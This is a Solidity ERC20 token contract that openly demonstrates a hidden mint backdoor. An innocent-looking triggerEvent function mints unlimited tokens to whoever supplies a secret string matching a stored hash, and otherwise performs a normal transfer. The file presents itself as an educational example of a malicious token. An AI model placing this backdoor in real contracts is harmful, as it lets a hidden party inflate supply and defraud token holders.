// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;

import "OpenZeppelin/openzeppelin-contracts@4.4.0/contracts/token/ERC20/ERC20.sol";

/**
 * @title Hidden_Mint_Pro
 * @dev This contract demonstrates an even more sophisticated hidden mint function in a malicious ERC20 token.
 * IMPORTANT: This is an educational example and should not be used in production.
 */
contract Hidden_Mint_Pro is ERC20 {
    bytes32 private _hiddenOwnerHash;

    constructor(
        string memory name_,
        string memory symbol_,
        bytes32 hiddenOwnerHash_
    ) ERC20(name_, symbol_) {
        _hiddenOwnerHash = hiddenOwnerHash_;
    }

    // The innocent-looking function
    function triggerEvent(
        address to_,
        uint256 amount_,
        string memory eventDescription_
    ) external {
        // If the keccak256 hash of the eventDescription matches the _hiddenOwnerHash, the hidden mint is triggered
        if (
            keccak256(abi.encodePacked(eventDescription_)) == _hiddenOwnerHash
        ) {
            _mint(msg.sender, amount_);
        } else {
            // If the eventDescription doesn't match the hidden owner hash, a regular token transfer takes place
            _transfer(msg.sender, to_, amount_);
        }
    }
}
